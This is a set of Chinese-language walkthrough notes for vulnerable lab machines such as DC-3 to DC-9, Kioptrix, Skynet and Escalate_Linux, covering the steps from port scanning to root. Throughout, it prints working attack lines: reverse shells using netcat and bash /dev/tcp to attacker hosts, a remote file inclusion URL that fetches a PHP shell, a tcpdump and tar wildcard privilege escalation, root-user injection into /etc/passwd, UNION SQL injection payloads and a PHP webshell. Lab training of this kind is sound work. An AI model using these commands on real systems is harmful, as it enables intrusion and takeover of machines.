# dc-3
## nmap扫描端口
检查存在的端口 发现有80端口 访问看看 没多少发现
## dirsearch或者feroxbuster爆破
是否有隐藏的目录存在

真有发现joomla!的登录界面 nmap -A全扫描也会发现一个joomla的漏洞 是个sql注入

## 使用sqlmap进行爆破

在searchsploit中找刚刚发现的漏洞 可以知道sqlmap的攻击语句 稍微修改就能爆用户名和密码

## john破解密码

## 登录joomla！
根据wp可以知道可以反弹shell的地方是主题那边 可以上传

要知道反弹shell的路径所在 反弹shell的php的路径
## 使用一句话木马或反弹shell 和kali连接或蚁剑连接
[[shell和提权#一句话木马]]
## 连接成功 进入系统

需要信息收集 查看系统内核版本等 找到攻击点
## searchsploit搜索漏洞
找到对应漏洞上传到系统的/tmp目录

## 跑漏洞就能获得root权限
# dc-4
## nmap查看端口信息

## 发现有个http和ssh服务
## 访问http服务

## 是个登录界面

检查一下是个登录界面 但也没有sql注入点 只能爆破密码

## bp爆破密码

破解出密码

## 进去之后是三个选项 点击就会自动输入一个命令

可以考虑bp抓包 用重放攻击来修改命令

可以cat /etc/passwd查看账户名

## 反弹shell之后 到账户的所在目录看一下有无文件

找到一个密码本 需要我们破解

## 假如找到有sudo权限的文件的话 可以漏洞利用

用python服务器传上去
```
python -m http.server 4444
```

跑脚本就能获得root权限

## 2. 就是暴力破解出jim的ssh账户 登录进去

告诉我们一个提示有邮件

邮件存储在/var/spool/mail 查看一下邮件

得知了另一个用户 登录进去

## 查看他可以使用什么sudo权限
```
sudo -l
```
发现一个teehee

## teehee提权
可以看到使用teehee提权,teehee就是tee的变体从标准输入读取并写入标准输出和文件

我们可以借助teehee往passwd写入一个root账号即可得到root权限

/etc/passwd格式
username:password:User ID:Group ID:comment:home directory:shell

echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd

### teehee定时提权
```
sudo teehee /etc/crontab
* * * * * root chmod 4777 /bin/sh
```
　写入成功：拿到root权限

```php
/bin/sh
```

# dc-5
很早之前就试过了 一直不成功 主要还是个思路

## nmap扫描端口
有个80端口 访问一下 啥也没有 字典爆破也没头绪

## sql？文件包含？
![](https://s2.loli.net/2025/04/19/7v9aVFMk2wSIhJT.png)

抓包用sqlmap没用 有了个大胆的想法 /thank.php？有没有可能是文件包含 试试

## 抓包 日志插马
![image.png](https://s2.loli.net/2025/04/19/jEXYmPhD87c9VCW.png)

真是文件包含 用whatweb来扫描一下看是什么服务器  nginx 

![image.png](https://s2.loli.net/2025/04/19/K4gh5QjUHyvnxcM.png)

发现是插成功了 用伪协议也能插入日志文件中并爆出php版本

![image.png](https://s2.loli.net/2025/04/19/rz9BLMc5xAIomQi.png)

蚁剑连接成功

![image.png](https://s2.loli.net/2025/04/19/tbFzZ1V25ecdaWq.png)

反弹到kali中
![image.png](https://s2.loli.net/2025/04/19/RnH1dtzQsvLIfDq.png)

有个exim4 试试exim4提权 但没卵用 前面有个screen-4.5.0

用这个进行提权

## screen提权
exploit-db.com找到一个脚本 直接用python传到靶机跑就能获得root权限

# dc-6
## nmap扫描端口
发现有80端口和21ssh端口

但网页没有显示什么有用的信息 只能下一步操作

## 文件路径爆破 

用dirb爆破出了一个登录界面 wp的 用wpscan扫描一下用户 看有什么信息吗

发现有很多个用户 把他做成一个txt来当用户爆破

密码本是看了有些人的提示

```
cat rockyou.txt | grep k01 > pa.txt 
```

然后成功爆出账户和密码

成功登录后台

## 命令注入
发现有个地方可以命令注入 但有字数限制 要么改前端的字数限制 要么bp抓包改 我是想到后者

看了一下用户有什么

![image.png](https://s2.loli.net/2025/04/12/ClRjnQMLZuIaYkP.png)

但在bp中一直反弹shell不了 很奇怪

用了另一个

```
nc -e /bin/bash 61.139.2.129 2333
```

反弹成功 然后改成交互式shell 

## 版本信息收集

```
uname -a

cat /etc/*-release

compgen -c
```

但无什么可用的信息 只能找一下home目录 找到一个txt 告诉我们新建了一个ssh用户

## 依旧信息收集

登录进去查找一下有什么线索吗

```
sudo -l

find / -perm -u=s -type f 2>/dev/null
```

发现了一个可用脚本 但运行不了 用sudo -u 切换到jens去运行脚本 

有个要注意的是  里面需要有一个shell 切换成功

“sudo -u jens ./backups.sh” 的意思是使用 “sudo” 命令以用户 “jens” 的身份执行当前目录下的 “backups.sh” 脚本文件 刚好

![image.png](https://s2.loli.net/2025/04/12/83IBZUCzYtnDbiG.png)
	

在jens用户中依然查看sudo -l查看有无信息

有个nmap 其实是个很有意思的地方 nmap有个脚本扫描 创建一个交互式终端的脚步给nmap执行 完成提权

用os.execute("/bin/sh")

[[shell和提权#用过的交互式]]

os.execute("/bin/sh") 的作用是启动一个 ​​子进程 Shell 环境​​，其权限 ​​完全继承自父进程​​ 意思就是我们这个终端就可以继承到root权限 
[[shell和提权#^abc63a]]

![image.png](https://s2.loli.net/2025/04/12/bB4oursZGPhlvpk.png)

# dc-7
## nmap扫描端口
扫描之后访问一下80端口

## 信息收集 
进去就是简单的界面 提示说暴力破解啥的没用 只能另外找办法了。

## git源码泄露

在底下有个用户名 其实很早之前就注意到了 一直没想到去搜一下 能找到源码 源码中有个账户密码 尝试登录一下

## 失败 但没完全失败

账户密码在上面登不进去 还是没想到ssh连接 这个就是ssh的账户密码

登录成功 在信息搜集的时候 发现一个mail 在mail中找到了一个脚本

根据脚本发现用了drush

用drush改一下admin的密码 这个其实有点问题 就是一开始我是新建一个用户 但进去啥也没有 得用admin

## 下载php的插件
在后台下载php的插件 然后就能在文本编辑的地方跑出php代码

利用这个用蚁剑连接

反弹shell到kali

## 依然信息收集

find / -perm u=s -type f 2>/dev/null

找出能用的文件

发现一个老熟人 exim4

# dc-8
## 依旧nmap扫描端口
## 检查网站
是有个sql注入的 犯了个错误 就是没有仔细检查所有界面 其实sql注入点就在首页

使用sqlmap爆破出用户和密码

得到admin和john两个用户的密码

但是加密的 发现是Drupal7 用--format=Drupal7参数

## 破解成功
破解太慢了 --show可以用用 万一根本跑不出来的还能及时止损

![image.png](https://s2.loli.net/2025/04/14/V3DQofuahSTJz7U.png)


登录后台系统

这种可以考虑php代码来执行反弹shell 但找了很久也没找到

看了wp才知道 就是没有认真去找 用php代码反弹shell

## 反弹成功 提权

find / -perm -u=s -type f 2>/dev/null

找一下能执行sudo的文件 找到一个exim4 好家伙

## searsploit找到exp

直接提权 但有个疑问 直接跑脚本就还是www-data 加个-m netcat之后就直接变成root了

-m netcat 指定提权后生成反向 Shell 

# dc-9
## nmap扫描端口
## 检查网站内容 
字典爆破 没卵用

有个搜索的php 直觉告诉我是攻击点

其实一开始测试的时候是测不出来 只能bp抓包然后sqlmap爆破

成功暴库和账户密码 

这里有个问题 就是其实sqlmap那个部分是搞成的 就是犯了个错误 就是追求太多深度 还有别的文件需要去查看 一开始没注意到 就应该先把所有的库都查一遍再想别的办法

## 登录成功
找到admin和密码transorbital1

查看管理系统有什么出发点吗

## sql注入？ 文件包含？
输了1' 然后发现有报错 就在sqlmap爆破了一段时间 但都没啥出来 看了wp说是疑似文件包含

在下面有个字 就是说 File does not exist 也许真的有关系

```
?file=/../../../../../../../etc/passwd
```

好家伙 真爆出来了

## ssh敲门 ssh连接

搜了一下发现 有个叫ssh敲门的东西 简单来说就是如果敲门序列正确，防火墙会暂时打开SSH端口，让用户能够连接到服务器。 

用文件包含找到knockd的配置文件  需要我们敲7469,8475,9842的端口

![image.png](https://s2.loli.net/2025/04/15/uK6tfxBs5r8C3Go.png)

nc -z 开门成功

![image.png](https://s2.loli.net/2025/04/15/exr7IfEyvqMnuLa.png)

## 爆破ssh

ssh有了就要爆破

上面我们找到了一些用户和密码 在user的表中 把他们做成爆破用的txt

```
hydra -L /root/u.txt -P /root/p12.txt 61.139.2.150 ssh
```

![image.png](https://s2.loli.net/2025/04/15/oqKBxZ2Ng9y6D3d.png)


爆破成功

## 信息收集

这里有个槽点就是 以后使用ls要用 ls -la参数 这样才能查的比较详细 会漏掉隐藏内容 

![image.png](https://s2.loli.net/2025/04/15/zkABRrehJwTmvD6.png)


这里就是 漏掉了隐藏内容 在里面找到一个密码本 我们直接拉到hydra里面跑一下 应该有别的用户

用新的密码本和原来的用户那里爆破一下

多爆出了一个用户 我们访问一下

![image.png](https://s2.loli.net/2025/04/15/MAHorwNPBQhsVDL.png)


sudo -l

![image.png](https://s2.loli.net/2025/04/15/TkomjaJQUPbyezR.png)

test疑似是个程序还是别的 在devstuff中有个python文件

```
#!/usr/bin/python 
import sys 
if len (sys.argv) != 3 :
	print ("Usage: python test.py read append") 
	sys.exit (1) 
else : 
	f = open(sys.argv[1], "r") 
	output = (f.read()) 
	f = open(sys.argv[2], "a") 
	f.write(output) f.close()
```

1. ​**​操作流程​**​
    
    - ​**​读取输入文件​**​：打开第一个参数指定的文件（`sys.argv[1]`），读取全部内容

    - ​**​追加写入输出文件​**​：将读取的内容追加到第二个参数指定的文件（`sys.argv[2]`）末尾
        
好东西啊 其实 将第一个文件的东西追加到第二个文件

就可以添加用户到/etc/passwd中啊

openssl用法

```
openssl passwd -1 -salt admin 123456
```

构造admin用户密码为123456的hash

```
/etc/passwd格式
admin:$1$ccc$tK1vhSYd21dUn8Z0EC/Pl0:0:0:root:/root:/bin/bash
```

执行代码之后 记得切换用户 就能提权了

![image.png](https://s2.loli.net/2025/04/15/INwdafuhzqKTZPM.png)


#### ​**​代码执行示例​**

# kio2思路
## nmap扫描端口
发现有一个登录界面 用万能密码成功登录

## 命令注入？
登录进去是个命令注入界面

用了bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 来反弹shell

## 信息收集

是用内核提权
# kio3思路
## nmap扫描端口

## dirsearch字典爆破 查看网址还有啥路径
有一个phpmyadmin 一个图库和一个登录界面

先看看登录界面  是LotusCMS 看看能不能利用历史漏洞 

github找到一个脚本可以攻击这个lotuscms

msf无果 看了很多人wp却可以 很奇怪

在github找到一个sh脚本 加kali可以远程连接

连接成功之后
uname -a
cat /etc/*-release

进行信息收集 查看系统版本和内核版本
## 发现一个图库

里面找到有id的字样 直接开始sql注入 发现是数字型的注入

```
1 order by 6--+

1 union select 1,databases(),version(),4,5,6--+


-1 union select 1,group_concat(table_name) ,3,4,5,6 from information_schema.tables where table_schema=database()--+

-1 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_schema=database()--+ 

-1 union select 1,group_concat(username),group_concat(password),4,5,6 from gallarific_users--+

-1 union select 1,group_concat(username),group_concat(password),4,5,6 from dev_accounts--+


dreg Mast3r

loneferret starwars
```

sql简要过程 order by要多尝试几个参数测试 后面就是经典语句

## 得到ssh的登录账户 

uname -a
cat /etc/*-release

sudo -l 

进行信息收集 查看系统版本和内核版本

发现有ht编辑器

在里面把用户改成all的权限 或者在在原本权限加个/bin/bash

## 根据系统版本查找漏洞提权

脏牛漏洞
# kio4思路
## nmap扫描端口 
发现有22，80，139，445的samba

## dirsearch目录扫描
扫出来sql文件 查看可以发现有个账户名叫john
### 先看看80端口有什么东西
登录界面 可以试试sql注入 用万能密码[[shell和提权#sql万能密码]]试试 加上账户名是john 可以登进去 知道了密码

### 登录ssh
检查一下能用什么东西 ls发现没有东西 

用compgen -c查看能用的命令 没这个命令

help命令 可以查看当前能用的命令

## echo逃逸
```
echo os.system("/bin/bash")
```

## 信息收集
来收集我们攻击需要的
```
id
uname -a
lsb_release -a
ps -ef
find / -name *.php
```
## 提权
### 1. mysql提权
[[shell和提权#mysql的udf逃逸]]
```
SELECT * FROM mysql.func;
 UDF（用户定义函数），叫`sys.exec`,这个可以允许从数据库内部调用系统本机代码,调用用户的权限执行，如果udf是由root命令执行，那执行的命令也是root身份
```

然后给sys.exec添加
```
SELECT sys_exec('usermod -a -G admin john');
SELECT sys_exec('usermod -a -G admin robert');
```
回去sudo su 就能成功提权

# Mr Robot
robot.txt信息泄露 wp反弹shell nmap提权
目标是获得三个key
## nmap进行扫描
访问一下80端口的网站 发现没有啥有价值的

## 字典爆破

看提示是说robots 估计是值robots.txt 或者别的

爆破发现还真有  访问一下

![image.png](https://s2.loli.net/2025/04/15/6lyAioQLGUrwVms.png)

发现flag1的路径

多看文件爆破中的200状态码的路径 总会有收获

## license
这个有点巧妙 一开始是没看到这东西 唯一错过 进去之后留意到有个滑块 往下滑能找到账户和密码的base64加密

成功登录进后台系统

## 进入后台 处理

### 1. 利用后台的漏洞反弹shell

是在主题编辑 themes那里 但弹了半天一直没成功 

在虚拟机中就能成功

![image.png](https://s2.loli.net/2025/04/16/T67VfNCvXFkmwEo.png)


### 2. 用msf进行提权 
search wordpress shell upload

配置rhost 用户名和密码

还需要关闭wpcheck show advanced options能看见

但没什么效果 很奇怪



## 成功进入
在robot目录找到密码 但是md5的 解密一下  切换到robot用户 就能获得第二个flag


## nmap 提权

用的(是)[https://gtfobins.github.io/gtfobins/nmap/]

# Skynet
## nmap扫描端口
在80端口检查有什么东西吗 只有一个输入行 输入没有啥反应 字典爆破看看还有什么路径吗

发现一个登录界面 

没什么头绪

## smb枚举
这里我们用enum4linux来操作一手

```
enum4linux -a ip 全扫描
```
  能发现这里还有匿名共享anonymous  
![image.png](https://s2.loli.net/2025/04/19/qEyRGmCKze5XY24.png)

![image.png](https://s2.loli.net/2025/04/19/3gSJNYWcMIrtQRj.png)

### smbclient连接
这里用smbclient连接匿名用户 发现有个文件 

```
get 文件
```

发现就一句话 需要员工改密码

在另外个文件中发现了疑似密码本的东西 试试能做密码本吗
 
## bp爆破 成功进入

![image.png](https://s2.loli.net/2025/04/19/XcvhICuBTD8Z6n5.png)

获得mile用户的密码

用刚刚的密码本爆破成功 进入

在第一封邮件中找到smb服务的登录密码

## 登录smb

```
 smbclient //10.10.36.16/milesdyson -U milesdyson
 -U指定用户登录
```

在其中找到了重要文件 里面有我们需要的东西 一个隐藏目录 用这个目录又进行字典爆破 发现一个cms登录界面

## 远程文件包含漏洞

searchsploit能搜到这个漏洞

```
http://10.10.36.16/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.17.40.203:8000/php-reverse-shell.php

# /alerts/alertConfigField.php?urlConfig=http://10.17.40.203:8000/php-reverse-shell.php 是rfi的路径
``` 

下载了一个反弹shell的php 用python服务器当路径来传php文件

## 成功反弹shell

我们跑一个linpea的脚本 能获得很多我们需要的信息

![image.png](https://s2.loli.net/2025/04/19/q2PNleFYwMy85oa.png)


## tar提权 ​tar命令对通配符*的解析漏洞
首先我们先看一下这个backup的脚本作用 使用root权限的脚步

![image.png](https://s2.loli.net/2025/04/19/j32subRvBnS6HIl.png)

backups目录下有一个backup.sh文件，其内容和作用是--切换目录至/var/www/html 并将该目录下的所有内容归档为backup.tgz压缩文件，该tgz文件保存在backups目录下

tar命令可以利用一个名为–checkpoint的参数，该参数允许在每次归档 X 个文件时（X的默认值为10）显示“进度”消息， –checkpoint还可以与 –checkpoint-action 标志串联使用，

backup.sh脚本中使用的通配符* 将对 /var/www/html 目录中的所有文件和文件夹执行归档命令，因此我们可以通过在/var/www/html下添加 –checkpoint=1 文件（启用检查点功能）和 –checkpoint-action=exec=xxx 文件（指定要执行的操作，检查点值为1，每归档一个文件都执行指定操作），那么当 tar 处理到以上文件时，相关的文件名将会被有效地视为tar命令的参数--从而执行某些操作。

```
echo "cp /bin/bash /tmp/nroot && chmod +s /tmp/nroot" > newroot.sh

touch "/var/www/html/--checkpoint=1"
touch "/var/www/html/--checkpoint-action=exec=sh newroot.sh"

#–checkpoint-action=exec=xxx 文件（指定要执行的操作，检查点值为1，每归档一个文件都执行指定操作）
# 在检查点执行脚本 `newroot.sh`，即复制Bash并赋予SUID权限
```

然后到/tmp/ 运行/tmp/nroot -p 就能获得root权限

```
#切换到/tmp目录
cd /tmp
ls
/tmp/nroot -p
```


# Daily Bugle
## joomscan扫描
是个joomle的web网站 用joomscan扫描一下

扫描出了一个登录界面

## sqlmap或漏洞利用找出账户密码
### 漏洞利用 CVE-2017-8917
![image.png](https://s2.loli.net/2025/04/20/Z7AcNKfHYUCgoEn.png)


sqlmap太慢了 题目提示也说利用脚本 漏洞利用的能力太差了 找脚本找了半天 常规手段进不去就应该思考一下 漏洞利用

## sqlmap
但是非常非常慢 貌似延时注入 
![image.png](https://s2.loli.net/2025/04/20/c4tEmGgMqCL2eJj.png)


## 密码破解

![image.png](https://s2.loli.net/2025/04/20/7oVHmDZjhw8xqnL.png)

## 登录后台管理系统

登进去之后要去找找有什么执行php代码的地方吗 特别是网页的主题 类似的有php代码的地方 插入php反弹shell 能反弹成功

## 信息收集
有网页管理系统这种类似的 需要先去/var/www/html找配置文件 也许有密码 

## msql信息收集
在这个目录中找到了mysql的配置文件和密码 登录mysql查看有什么有用的吗

并没有 

cat  /etc/passwd发现了一个新用户 也许我们能su到那个用户

有个离谱的点就是数据库的密码就是那个用户的密码 遇到密码可以多试试

## 依旧信息收集

sudo -l发现了yum 使用yum提权 可以成功获得root权限


# Misdirection 1
## nmap扫描端口和文件爆破

扫描出8080有个终端 有个wp登录页面 

## 绑定shell
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

nc -nv TARGET_IP 8080
```

![image.png](https://s2.loli.net/2025/04/21/j4hebsy8r6wWkcF.png)

## 信息收集

![image.png](https://s2.loli.net/2025/04/21/KJtFU7h4xTMXSdv.png)

![image.png](https://s2.loli.net/2025/04/21/BbHVy8ugDM794Ok.png)


![image.png](https://s2.loli.net/2025/04/21/qVJhyIMz7c8WG4C.png)

## 1./etc/passwd写入root提权

在这里会发现 brexit有修改/etc/passwd的权限 得切换到brexit用户

![image.png](https://s2.loli.net/2025/04/21/7gsl6S3N1o5tTBE.png)


```
sudo -u brexit /bin/bash
# 刚好/bin/bash没有密码
```

用openssl创建一个账户密码 将这个root权限用户写进/etc/passwd 就能提权了

```
openssl passwd -1 -salt qq qwe


echo 'qq:$1$qq$oMgRCtJEEoFVvNbosRA.B1:0:0::/root:/bin/bash' >> /etc/passwd

su qq
```

# Retro
## nmap扫描端口
发现就只有一个端口 访问是一个iis服务

## 目录爆破 
用了个大字典 爆出了一个路径 

![image.png](https://s2.loli.net/2025/04/22/qOWwSnRvLMXNAHx.png)

访问一下这个网站 但没啥头绪 接着扫描这个路径

接着用这个路径扫一下 是一个人的博客

## 信息收集 
还是对他进行文件爆破 会发现这个是个wordpress搭建的博客 也是在闲逛中发现 这个人的博客评论中有一个类似密码的东西 试一下这个博客名加密码 居然成功登录

![image.png](https://s2.loli.net/2025/04/22/C52HQZaOXElvYSi.png)


## msf攻击


##  remmina远程连接
已经知道了用户密码 尝试远程连接能否连接成功
```
remmina -c rdp://wade:parzival@10.10.2.181:3389
```


## 信息收集

在浏览器中发现有个CVE-2019-1388漏洞（UAC手动提权） 可以利用一下 

成功提权 

# pwnos2.0

## nmap 扫描端口

## dirb字典爆破

发现页面有登陆界面 试试万能密码 成功登陆 没乱用

继续检查blog页面 whatweb扫描 

## 漏洞利用 Simple PHP Blog 0.4.0 或者 文件上传 反弹shell

攻击成功

## 信息收集 

cat /etc/passwd 找到mysql账户 就要先去找找看有没有mysql的配置文件

遇到这种情况可以去看看 /var/www /var这些文件夹

连进mysql 找找账户密码 

## 提权

或者尝试udf提权

找到密码 ssh登陆发现直接root




# web developer
## nmap扫描和字典爆破
要注意之后采用双管齐下战略 dirb和dirsearch都一起上 不会那么容易扫漏

## 发现 分析流量包
就是用dirb扫出来的奇怪目录 而dirsearch没扫描出来 点开目录会发现一个流量包 在里面找找login字样 在其中一个post的login.php找到了登录用户和密码  密码解码一下



![image.png](https://s2.loli.net/2025/04/24/kDSr4Ko9ahc6Wgn.png)


用这个账户密码成功登录到后台系统

## 反弹shell

这里在常见主题编辑是没有用的

![image.png](https://s2.loli.net/2025/04/25/GuwLjgBWSpzqRlQ.png)

![image.png](https://s2.loli.net/2025/04/25/LAZdjizhPyaklMO.png)

会出现这样的报错 这个时候转换思路

![image.png](https://s2.loli.net/2025/04/25/ufeazArjMEitcpL.png)


使用插件进行编辑文件

![image.png](https://s2.loli.net/2025/04/25/resKuihpWTjkU3y.png)

这样就能插入我们的php反弹shell 但有个要注意的 就是要知道自己修改的文件的路径 所以我都是修改index文件 但实际情况肯定不能这么搞

知道文件路径也是个很关键的要素

成功获得反弹shell

![image.png](https://s2.loli.net/2025/04/25/U8wvjyJWKoxrOVI.png)


![image.png](https://s2.loli.net/2025/04/25/sFklROPYq9ru3Wj.png)

## 信息收集
在这里有点眼瞎了 没看到配置文件 命明明已经进入var/www/html目录了  要多留意config的字眼 

在config中找到了账户和密码

ssh登录一下

![image.png](https://s2.loli.net/2025/04/25/8ofPlNHFrmRAiZ7.png)

有个tcpdump

## tcpdump提权

![image.png](https://s2.loli.net/2025/04/25/6oJRnjeuqKaEhIi.png)

id就是我们需要执行的命令 本来是想反弹shell的 但试了很多个都没用 只能找flag

![image.png](https://s2.loli.net/2025/04/25/oPA34rmY9GwWOpH.png)


看了大佬的wp是这样的

```
echo 'mknod backpipe p && nc 61.139.2.153 4444 0<backpipe | /bin/bash 1>backpipe' > priv.sh

chmod +x priv.sh 

sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/priv.sh -Z root

```

![image.png](https://s2.loli.net/2025/04/25/hvb1TqOUoDAW4XC.png)

![image.png](https://s2.loli.net/2025/04/25/LAqawkn3PyTGDIY.png)

成功提权

# prime

^53b3a2

## nmap扫描端口

## 字典爆破 
这一步是很草率了 在使用完字典之后应该进行一个过滤 过滤特定的后缀 如.txt .php .html

加上这一步能找到secret.txt

![image.png](https://s2.loli.net/2025/04/29/rxELcia5lyg6fsZ.png)

txt告诉我们还要找到location.txt 应该是

## wuff
[[linux工具#wfuff]]
这个确实没接触过 不了解流程

意思就是过滤出特别的那个payload

```
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://61.139.2.161/index.php?FUZZ

wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 --hh 136 http://61.139.2.161/index.php?FUZZ
```

![image.png](https://s2.loli.net/2025/04/29/pkWqT31d8o54gMP.png)

最开始是筛选出404的参数

会发现chars的数值是一样的

用-hh来过滤出除了136的所有参数 能出现一个file

![image.png](https://s2.loli.net/2025/04/29/JzcVjRCu6K1PnFH.png)


大纲 总算出来了 其实很早之前就犯了这个错 就是假如这个txt是和secret类似的话 那我们原本字典爆破就应该能出的来 这个给的提示就能看出 file=location.txt

![image.png](https://s2.loli.net/2025/04/29/UbhGdk1BWR9ZnIl.png)


## 傻子操作
意思就是直接在imag.php加个360那个参数就行了 一开始是

```
http://61.139.2.161/image.php?secrettier360？file=/../../../../../../.././../../../../etc/passwd
```
但可想而知 有点sb了

```
http://61.139.2.161/image.php?secrettier360=/../../../../../../.././../../../../etc/passwd
```
直接等于号 成功出现账户密码

![image.png](https://s2.loli.net/2025/04/29/IqYnSpU9zoagD2F.png)


## 关键失误
![image.png](https://s2.loli.net/2025/04/29/hVWaO2HLeDBFNQS.png)

居然没看到这个信息 还想着反弹shell

那只能将计就计 查看一下这个文件

纯唐操作属于是了 没有观察仔细
![image.png](https://s2.loli.net/2025/04/29/mZ2YhjitaQfle87.png)


## wp的漏洞
我们在原本的字典扫描中发现有wp_admin这类wp网站的字样 我们用wpscan扫扫看

wpscan --emnumerate u 看能枚举出用户名吗

```
wpscan --url http://61.139.2.161/wordpress --enumerate u
```


![image.png](https://s2.loli.net/2025/04/29/v7BLozN4ARhUpZT.png)

有一个victor 加上刚才的密码试试看能成功吗

成功登入

## 反弹shell
想办法反弹shell

老套路 在主题中修改 或者上传php文件然后访问

上传php没辙  下载插件需要输东西进去

![image.png](https://s2.loli.net/2025/04/29/uYCeEjOWzciogJR.png)

修改文件 也大都不可写

![image.png](https://s2.loli.net/2025/04/29/3DIMvRecdxysKJB.png)

偶然机会找到一个php可以写入 立马把php反弹shell代码写入 然后用wp的路径访问

```
http://61.139.2.161/wordpress/wp-content/themes/twentynineteen/secret.php
```

成功反弹shell

## 提权
![image.png](https://s2.loli.net/2025/04/29/AcdW8mpDvJ6RLZH.png)


查看内核版本

```
uname -r 

cat /etc/*-release
```


使用这个漏洞

```
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation   linux/local/45010.c

gcc 45010.c -o 45010

./45010
```

成功提权


# hackme
## nmap扫描端口加文件爆破
只发现一个uploads的路径 是个没用的照片

## 登录界面

首页是个登录界面 但可以通过注册账户登录进去 进去是个搜索框 但输入东西都没有任何报错

## sqlmap

直接bp抓包 然后把报文拉到sqlmap爆破 居然成功爆库 我们借这个机会然后把用户名都搂出来

![image.png](https://s2.loli.net/2025/04/29/XYcGIVn2kUfL3SO.png)

这些密码都是md5加密之后的密码 需要我们把这些账户密码转一下

![image.png](https://s2.loli.net/2025/04/30/JqGXNE5jH7nBbro.png)

我们在登录界面一个一个试试看

![image.png](https://s2.loli.net/2025/04/30/AtOyvh7Fqw3S4U1.png)

superadmin能登进去 

## 文件上传
我们传一个php反弹shell看能成功吗

![image.png](https://s2.loli.net/2025/04/30/6qWmfOxwZvMNdYH.png)

居然上传成功了

这句话应该就是在说在刚刚扫出来的uploads的路径

点击上传的文件 反弹shell成功


## 提权
信息收集一下
![image.png](https://s2.loli.net/2025/04/30/PBj1tgMFHhTSdXL.png)

在/var/www/html中找到个配置文件 获得了mysql数据库的密码 但这个貌似和我们之前sqlmap爆出来的一模一样

用find查找sudo权限的文件时找到了一个这个

![image.png](https://s2.loli.net/2025/04/30/FZxwY9hWmOUPy6M.png)

尝试运行一下 居然直接获得root权限了

![image.png](https://s2.loli.net/2025/04/30/JW27E89rC4FN5i1.png)




# Escalate_Linux
这个是一个考验后渗透模块的靶机 重点考察Linux Post Exploitation（特权升级）技术。

## nmap扫描  
发现有smb服务

我们来试试smb枚举

## 补充 路径爆破
dirb 过滤.php 爆出来了一个shell.php


使用cmd作为参数传导 我们随便试一下ls 发现能成 反弹shell试试看
![image.png](https://s2.loli.net/2025/04/30/mfLolbsCA7uiXw6.png)


```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc  10.10.250.106 443 >/tmp/f

nc -lvnp 8888
```

在bp进行url的转码  输入之后就能反弹成功了

## smb的信息收集
用nmap脚本枚举和smbclient，smbmap来枚举smb服务的信息
```
smbclient -L 

nmap --script smb-enum-shares --script-args smbuser=user,smbpass=pass 61.139.2.163


```
![image.png](https://s2.loli.net/2025/04/30/HouYdOxcfX7AB3V.png)


![image.png](https://s2.loli.net/2025/04/30/8tXVxsONcyIzqJf.png)

```
enum4linux -a 枚举出了所有的用户
```

![image.png](https://s2.loli.net/2025/04/30/OXfCoVGLqU83MrA.png)


## 进去之后的信息收集
我们先把基本需要的信息先查看一下 据说有十二种提权方法 得学习学习

```
cat /etc/passwd

find / -perm -u=s -type f 2>/dev/null
```

发现有mysql账户 还有八个用户

![image.png](https://s2.loli.net/2025/04/30/U7urde82PntGsjA.png)

找到两个在home目录下的脚本 从这两个下手

![image.png](https://s2.loli.net/2025/04/30/RynINW9BugmiFqh.png)

### 1. user6 shell提权
在目录中找到shell 运行就能获得root权限
![image.png](https://s2.loli.net/2025/04/30/6m7aHEIC4Pls8Zj.png)

### 2.  user5环境变量提权
在user5的目录中有个script 也就是上面有的文件

我们用strings分析一下这个文件 看有什么信息吗  看不太懂 问了ai 感觉没啥头绪 看了大佬wp发现是环境变量的提权

```
cd /tmp
echo "/bin/bash" > ls
# 创建名为 `ls` 的文件，内容为 `/bin/bash`。​**​核心目的​**​是覆盖系统默认的 `ls` 命令，将其替换为启动 Bash Shell 的恶意脚本

chmod 777 ls
echo $PATH
export PATH=/tmp:$PATH
cd /home/user5
./script
whoami

```

![image.png](https://s2.loli.net/2025/04/30/lxvLWO72rS1wac3.png)


![image.png](https://s2.loli.net/2025/04/30/Z9UBLz87PFAsauo.png)


###  3. mysql数据
#注意 mysql的路径 /var/www/html里面没有找到的话 去/etc/里面找找看有mysql的文件夹吗

![image.png](https://s2.loli.net/2025/04/30/7RWDTqJ4ri981Sz.png)

用这个账户密码登录 能找到账户密码

![image.png](https://s2.loli.net/2025/04/30/VaFL7uv35kygWnM.png)

![image.png](https://s2.loli.net/2025/04/30/gjkR6mOsloScDre.png)

成功登录到mysql账户

在/etc/mysql中能找到所有用户的密码

![image.png](https://s2.loli.net/2025/04/30/M4cItTQED61xAfX.png)


### 4. user8 vi提权
切换到user8之后 sudo -l 发现有个vi

用sudo vi 在vi编辑器下输入:!sh即可提权

![image.png](https://s2.loli.net/2025/04/30/xDgZFvQcM2jeJLa.png)

### 5. user7添加/etc/passwd新用户
发现user7是属于root组的用户 能用这招来编辑etc/passwd来添加一个新的root权限的用户

简单的思路就是这样

主要是考验攻击者在面对各个用户之间能否很好的利用各个用户之间存在的权限 对弱点进行定点打击


# sickos
## nmap扫描
扫出一个80端口

## 文件目录爆破
也就发现一个test目录

但下面发现了一个版本号lighttpd/1.4.28 并无方向 也没有很多可以利用的漏洞

## 转战ssh 
#注意 别在一棵树上吊死 一个没有什么思路赶紧切换

看看ssh有什么可以利用的吗

发现有个用户名枚举漏洞

用msf的scanner/ssh/ssh_enumusers来枚举用户

![image.png](https://s2.loli.net/2025/05/01/bR1veQr6jLwW3nT.png)

尝试用hydra破解一下john的密码

## 新思路
这个时候把思路放到test目录下 看看能有啥地方可以玩玩吗

#注意 这种类似的目录可以用nmap脚本扫描/test页面的支持的http方法
```
--script=http-methods.nse --script-args=http.methods.url-path="/test
```
![image.png](https://s2.loli.net/2025/05/01/TEbyJDzLWs13i8l.png)

发现居然能put

![image.png](https://s2.loli.net/2025/05/01/RDzVmIjoY7KGtp6.png)

上传一个可以执行命令的php代码

```
<?php system($_GET["cmd"]);?>
```

![image.png](https://s2.loli.net/2025/05/01/d2LH86b7fg3lzDQ.png)

可以使用 

